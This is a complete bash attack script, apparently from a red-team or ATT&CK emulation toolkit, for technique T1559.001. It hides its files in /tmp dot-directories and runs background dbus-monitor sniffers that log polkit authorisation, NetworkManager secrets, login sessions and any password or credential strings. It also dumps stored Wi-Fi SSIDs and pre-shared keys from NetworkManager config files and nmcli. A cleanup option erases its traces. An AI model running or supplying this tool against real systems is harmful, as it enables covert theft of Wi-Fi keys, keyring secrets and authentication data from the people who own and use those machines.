#!/bin/bash
# T1559.001 — Inter-Process Communication: D-Bus Method Interception
# Monitor/hijack system D-Bus to capture secrets and intercept auth

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MARKER="d3m0n_dbus"
WORKDIR="/tmp/.${MARKER}"
LOGFILE="/tmp/.${MARKER}_capture.log"

banner() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1559.001 — D-Bus Method Interception       ║"
    echo "  ║   Sniff/hijack system IPC communications      ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

deploy_dbus_monitor() {
    echo -e "${CYAN}[*] Deploying D-Bus interception${NC}"

    echo -e "${YELLOW}[*] D-Bus is the primary IPC mechanism on Linux desktops/servers."
    echo -e "    System bus: polkit auth, NetworkManager passwords, systemd commands"
    echo -e "    Session bus: gnome-keyring secrets, clipboard, notifications${NC}"
    echo ""

    if ! command -v dbus-monitor &>/dev/null; then
        echo -e "${RED}[!] dbus-monitor not found${NC}"; return
    fi

    echo -e "  ${CYAN}[a]${NC} Monitor system bus (requires root) — capture polkit/NM/systemd"
    echo -e "  ${CYAN}[b]${NC} Monitor session bus — capture keyring/clipboard"
    echo -e "  ${CYAN}[c]${NC} Targeted WiFi password extraction (NetworkManager)"
    echo ""
    read -p "  Choose [a/b/c]: " MODE

    mkdir -p "$WORKDIR"

    case "$MODE" in
        a) monitor_system_bus ;;
        b) monitor_session_bus ;;
        c) extract_nm_passwords ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

monitor_system_bus() {
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required for system bus monitoring${NC}"; return; }

    cat > "${WORKDIR}/dbus_sniff.sh" << 'SEOF'
#!/bin/bash
# Capture interesting system bus messages
LOGFILE="LOGFILE_PLACEHOLDER"
dbus-monitor --system 2>/dev/null | while IFS= read -r line; do
    # Filter for interesting patterns
    case "$line" in
        *"org.freedesktop.PolicyKit"*|*"CheckAuthorization"*)
            echo "[POLKIT] $line" >> "$LOGFILE" ;;
        *"org.freedesktop.NetworkManager"*|*"Secrets"*|*"WirelessSecurity"*)
            echo "[NM-SECRET] $line" >> "$LOGFILE" ;;
        *"org.freedesktop.login1"*|*"Session"*)
            echo "[LOGIN] $line" >> "$LOGFILE" ;;
        *"password"*|*"Password"*|*"secret"*|*"Secret"*|*"credential"*)
            echo "[CRED] $line" >> "$LOGFILE" ;;
    esac
done &
SEOF
    sed -i "s|LOGFILE_PLACEHOLDER|${LOGFILE}|g" "${WORKDIR}/dbus_sniff.sh"
    chmod 755 "${WORKDIR}/dbus_sniff.sh"

    nohup "${WORKDIR}/dbus_sniff.sh" &>/dev/null &
    echo -e "${GREEN}[+] System bus monitor active (PID: $!)${NC}"
    echo -e "${GREEN}[+] Logging to: ${LOGFILE}${NC}"
    echo -e "${YELLOW}[*] Captures: polkit auth, NetworkManager secrets, login sessions${NC}"
}

monitor_session_bus() {
    if [[ -z "$DBUS_SESSION_BUS_ADDRESS" ]]; then
        # Try to find a session bus
        for pid in $(pgrep -u "$(id -u)" dbus-daemon 2>/dev/null); do
            local addr
            addr=$(grep -z "DBUS_SESSION_BUS_ADDRESS" /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | cut -d= -f2-)
            if [[ -n "$addr" ]]; then
                export DBUS_SESSION_BUS_ADDRESS="$addr"
                break
            fi
        done
    fi

    if [[ -z "$DBUS_SESSION_BUS_ADDRESS" ]]; then
        echo -e "${RED}[!] No session bus found${NC}"; return
    fi

    nohup dbus-monitor --session > "${LOGFILE}" 2>&1 &
    echo -e "${GREEN}[+] Session bus monitor active (PID: $!)${NC}"
    echo -e "${GREEN}[+] Logging to: ${LOGFILE}${NC}"
    echo -e "${YELLOW}[*] Captures: keyring access, clipboard, application secrets${NC}"
}

extract_nm_passwords() {
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    echo -e "${CYAN}[*] Extracting WiFi passwords from NetworkManager...${NC}"
    echo ""

    local NM_CONN_DIR="/etc/NetworkManager/system-connections"
    if [[ ! -d "$NM_CONN_DIR" ]]; then
        echo -e "${RED}[!] NetworkManager connections not found${NC}"; return
    fi

    echo -e "  ${YELLOW}WiFi credentials:${NC}"
    for conn in "$NM_CONN_DIR"/*; do
        [[ -f "$conn" ]] || continue
        local SSID PSK
        SSID=$(grep -i "^ssid=" "$conn" 2>/dev/null | cut -d= -f2)
        PSK=$(grep -i "^psk=" "$conn" 2>/dev/null | cut -d= -f2)
        if [[ -n "$SSID" && -n "$PSK" ]]; then
            echo -e "    ${GREEN}${SSID}${NC} → ${PSK}"
            echo "${SSID}:${PSK}" >> "${LOGFILE}"
        fi
    done

    # Also try nmcli
    echo ""
    echo -e "  ${YELLOW}Via nmcli:${NC}"
    nmcli -s -g 802-11-wireless.ssid,802-11-wireless-security.psk connection show 2>/dev/null | \
        while IFS=: read -r ssid psk; do
            [[ -n "$ssid" && -n "$psk" ]] && echo -e "    ${GREEN}${ssid}${NC} → ${psk}"
        done

    echo ""
    echo -e "${GREEN}[+] Passwords saved to: ${LOGFILE}${NC}"
}

cleanup() {
    echo -e "${CYAN}[*] Cleaning up D-Bus interception...${NC}"

    pkill -f "dbus_sniff" 2>/dev/null
    pkill -f "dbus-monitor.*${MARKER}" 2>/dev/null
    rm -f "$LOGFILE"
    rm -rf "$WORKDIR"

    echo -e "${GREEN}[+] D-Bus interception removed${NC}"
}

main() {
    banner

    echo -e "  ${CYAN}[1]${NC} Deploy D-Bus interception"
    echo -e "  ${CYAN}[2]${NC} Cleanup"
    echo ""
    read -p "Choose [1-2]: " OPT

    case "$OPT" in
        1) deploy_dbus_monitor ;;
        2) cleanup ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
